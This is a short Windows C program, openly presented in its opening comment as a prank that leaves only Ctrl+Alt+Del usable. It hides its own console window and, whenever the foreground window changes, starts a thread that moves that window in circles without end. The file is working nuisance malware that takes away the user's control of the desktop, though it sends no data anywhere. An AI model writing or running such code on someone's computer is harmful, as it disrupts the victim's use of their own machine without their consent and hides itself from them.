// Randomly moves the window round. Only Ctrl+Alt+Del will work here.

#include <windows.h>
#include <math.h>

DWORD WINAPI moveit(){
    HWND a=GetForegroundWindow();
    int i,j,k=1;
    while(k++){
        i=200+300*cos(k);
        j=150+300*sin(k);
        MoveWindow(a,i,j,i,j,1);
        Sleep(50);
    }
}

main(){
    DWORD dwThreadId;
    HWND last=GetForegroundWindow();
    ShowWindow(last, SW_HIDE);
    while(1){
        if(last!=GetForegroundWindow()){
            last=GetForegroundWindow();
            CreateThread(NULL, 0, moveit, &last, 0, &dwThreadId);
        }
    }
}
